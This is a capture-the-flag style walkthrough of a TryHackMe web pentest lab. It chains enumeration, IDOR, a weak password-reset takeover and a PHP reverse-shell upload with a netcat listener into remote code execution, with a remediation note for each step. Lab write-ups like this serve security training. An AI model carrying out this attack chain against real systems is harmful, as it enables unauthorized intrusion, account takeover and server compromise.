# 🛡️ Guided Pentest: Web — RecruitX Walkthrough

> Platform: TryHackMe  
> Path: Junior Penetration Tester  
> Category: Web Application Pentesting

---

# 📌 Scenario

RecruitX is an internal recruitment portal used by hiring managers and administrators to manage job listings and applications.

The client suspects the application contains multiple security weaknesses and requested a penetration test to identify and exploit potential vulnerabilities.

---

# 🎯 Objectives

- Perform reconnaissance and enumeration
- Exploit an IDOR vulnerability
- Abuse a weak password reset mechanism
- Gain administrator access
- Achieve remote code execution

---

# 🔎 Reconnaissance & Enumeration

## Port Scanning

The first step was identifying exposed services using Nmap.

```bash
nmap -sV -sC --min-rate 1000 -T4 10.48.169.161
```

## Results

```text
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http
```

## Analysis

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | Potential post-exploitation access |
| 80 | Apache Web Server | Main target application |
| 3306 | MySQL | Backend database service |
| 8080 | Apache Default Page | Additional web service |

### Nmap Output

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-22 23:53 CAT
Nmap scan report for 10.48.169.161
Host is up (0.42s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

📸 **Screenshot:** `screenshots/nmap-scan.png`

---

# 🌐 Web Enumeration

Checking HTTP headers using curl:

```bash
curl -I http://10.48.169.161/
```

## Findings

- Apache/2.4.58
- PHP session cookies
- RecruitX v2.4 banner

## Observed Endpoints

- `login.php`
- `register.php`
- `jobs.php`

## Technology Stack

- Apache
- PHP
- MySQL

### Response Headers

```http
HTTP/1.1 200 OK
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=iur9kiov10a8bup6lo941q13b4; path=/
```

📸 **Screenshot:** `screenshots/homepage.png`

---

# 📂 Directory Enumeration

Gobuster was used with a common wordlist to enumerate hidden directories.

```bash
gobuster dir -u http://10.48.169.161 -w /usr/share/wordlists/dirb/common.txt
```

## Interesting Directories

| Endpoint | Observation |
|---|---|
| `/admin` | Admin portal |
| `/api` | Exposed API endpoints |
| `/reset.php` | Password reset functionality |
| `/uploads` | File upload storage |
| `/profile.php` | User profiles |
| `/dashboard.php` | Authenticated dashboard |

## Security Insight

The presence of:

- `/api`
- `/uploads`
- `/reset.php`

suggested multiple potentially vulnerable attack surfaces.

📸 **Screenshot:** `screenshots/gobuster.png`

---

# 👤 User Registration

A standard user account was created:

```text
Email: mcprettie@mines.me
Password: 123456
```

Successfully authenticated through:

```text
/login.php
```

📸 **Screenshot:** `screenshots/login-success.png`

---

# 🔍 API Enumeration

Enumerating the API revealed exposed endpoints.

```bash
curl http://10.48.169.161/api/
```

## Response

```json
{
  "endpoints":[
    "/api/user",
    "/api/jobs",
    "/api/applications"
  ]
}
```

## Vulnerability Identified — Information Disclosure

The application exposed internal API routes without authentication controls.

## Offensive Security Relevance

Information disclosure assists attackers during reconnaissance by revealing hidden functionality and expanding the attack surface.

📸 **Screenshot:** `screenshots/api-enum.png`

---

# 🔓 Insecure Direct Object Reference (IDOR)

While viewing the profile page, the application referenced users using numeric IDs.

```text
/profile.php?id=7
```

Changing the ID parameter exposed profiles belonging to other users.

## Example

```text
/profile.php?id=1
```

Returned:

```text
Sarah Mitchell — Administrator
```

Additional enumeration exposed multiple users.

---

# API Exploitation

The same issue existed within the API.

```bash
curl -s http://10.48.169.161/api/user?id=2
```

## Response

```json
{
  "id":2,
  "name":"James Crawford",
  "email":"j.crawford@recruitx.thm",
  "role":"hiring_manager"
}
```

Additional enumeration revealed:

| ID | Name | Role |
|---|---|---|
| 1 | Sarah Mitchell | Administrator |
| 2 | James Crawford | Hiring Manager |
| 3 | Priya Desai | Hiring Manager |
| 4 | Tom Beckett | Candidate |
| 5 | Amina Yusuf | Candidate |
| 6 | Test | Candidate |

---

# Root Cause

The application failed to verify whether the authenticated user was authorized to access the requested object.

---

# Impact

An attacker could:

- Enumerate users
- Harvest email addresses
- Identify privileged accounts
- Gather intelligence for further attacks

---

# Remediation

- Enforce server-side authorization checks
- Validate ownership before returning objects
- Replace predictable IDs with UUIDs where possible

## OWASP Mapping

- Broken Access Control
- OWASP Top 10 A01:2021

📸 **Screenshot:** `screenshots/idor-admin-profile.png`

---

# 🔑 Weak Password Reset Vulnerability

Testing the password reset mechanism revealed major flaws:

1. Reset tokens used only 6 digits
2. Reset tokens were displayed directly on the page

This allowed administrator account takeover.

## Compromised Account

```text
s.mitchell@recruitx.thm
```

Password changed to:

```text
654321
```

Successful administrator login followed.

---

# Root Cause

The application exposed reset tokens directly to users and used weak predictable tokens.

---

# Impact

An attacker could fully compromise arbitrary accounts.

---

# Remediation

- Generate cryptographically secure reset tokens
- Store tokens server-side
- Never expose tokens in client responses
- Implement expiration timers

## OWASP Mapping

- Identification and Authentication Failures
- OWASP Top 10 A07:2021

📸 **Screenshot:** `screenshots/password-reset.png`

---

# 🛠️ Admin Panel Access

After authenticating as administrator, an upload functionality was discovered.

The application claimed to restrict uploads to:

- PDF
- PNG
- JPG
- DOCX

However, `.phtml` files were accepted.

## Security Issue

The server validated uploads insecurely and failed to properly restrict executable file extensions.

📸 **Screenshot:** `screenshots/admin-upload.png`

---

# 💥 Remote Code Execution (RCE)

A PHP reverse shell payload was uploaded as:

```text
shell.phtml
```

The payload used was the well-known PentestMonkey PHP reverse shell.

## Listener Setup

```bash
nc -lvnp 1234
```

The payload was triggered by visiting:

```text
http://10.48.169.161/uploads/documents/shell.phtml
```

This resulted in remote command execution on the server.

---

# Shell Access

Once the reverse shell connected successfully, command execution was confirmed.

```bash
whoami
id
hostname
```

📸 **Screenshot:** `screenshots/reverse-shell.png`

---

# Root Cause

The application failed to properly validate uploaded file types and allowed executable server-side scripts.

---

# Impact

An attacker could:

- Execute arbitrary commands
- Gain server access
- Access sensitive files
- Pivot further into the network

---

# Remediation

- Block executable extensions
- Validate MIME types server-side
- Store uploads outside the web root
- Disable script execution in upload directories

## OWASP Mapping

- Security Misconfiguration
- Software and Data Integrity Failures

---

# 🧾 Artefacts

| Artefact | Location |
|---|---|
| Uploaded shell | `/uploads/documents/shell.phtml` |
| Modified admin password | `654321` |

---

# 🏁 Conclusion

The RecruitX application contained multiple critical vulnerabilities that enabled a complete compromise of the platform.

The attack chain demonstrated how seemingly small issues such as information disclosure and IDOR can ultimately lead to full remote code execution when vulnerabilities are chained together.

The assessment highlighted weaknesses in:

- Access control
- Authentication
- File upload validation
- Secure development practices

A defense-in-depth approach alongside secure coding practices would significantly reduce the application's attack surface.

---

# 📚 Key Takeaways

- Never trust client-side access controls
- Sensitive API endpoints should require authorization
- Password reset functionality must be implemented securely
- File upload functionality is highly dangerous when improperly validated
- Small vulnerabilities chained together can lead to full compromise

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- Curl
- Netcat
- PHP Reverse Shell
- Linux Terminal

---

# 📖 Learning Outcomes

This room provided practical experience in:

- Web enumeration
- API testing
- Access control testing
- Authentication attacks
- File upload exploitation
- Remote code execution
- Post-exploitation basics

```